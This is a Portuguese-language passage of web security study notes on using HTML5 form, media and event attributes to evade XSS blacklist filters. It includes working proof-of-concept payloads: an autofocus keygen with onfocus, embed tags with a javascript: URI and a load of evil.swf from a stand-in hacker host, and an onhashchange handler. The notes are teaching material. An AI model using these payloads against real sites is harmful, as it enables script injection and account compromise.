# HTML5 - Intro, Recap & More

## Semantics

Com as atualizações do HTML5 novos elementos foram inseridos como por exemplo, elementos de mídia, tipos de formulário e atributos. 

Com isso podemos usar esses elementos para burlar filtros de blacklisting em ataques de XSS por exemplo

**Form Elements**

Um elemento novo é o <keygen>que possui o atributo autofocus. Útil para explorar XSS sem interação do usuário

```html
<form action="#" method="GET">
	Encryption: <keygen name="security" autofocus onfocus="alert(1);">
</form>
```

**Media Elements**

Além dos elementos \<video> e \<audio> que são comumente usados, também existem os elementos <source>, <track> e \<embed> que possuem o atributo src

```html
<embed src="http://hacker.site/evil.swf">
<embed src="javascript:alert(1)">
```

**Semantic/Structural Elements**

Existem muitos outros elementos usados para melhorar a estrutura da página como:
\<article>, \<figure>, \<footer>, \<header>, \<main>, \<mark>, \<nav>, \<progess>, \<section>, \<summary>, \<time>, etc...

Todos eles suportam Event Attributes

**Attributes**

Existem uma lista enorme de eventos interessantes como: onhashchange, onformchange, onscroll, onresize...

```html
<body onhashchange="alert(1)">
	<a href="#">Click me!</a>
```

## Offline & Storage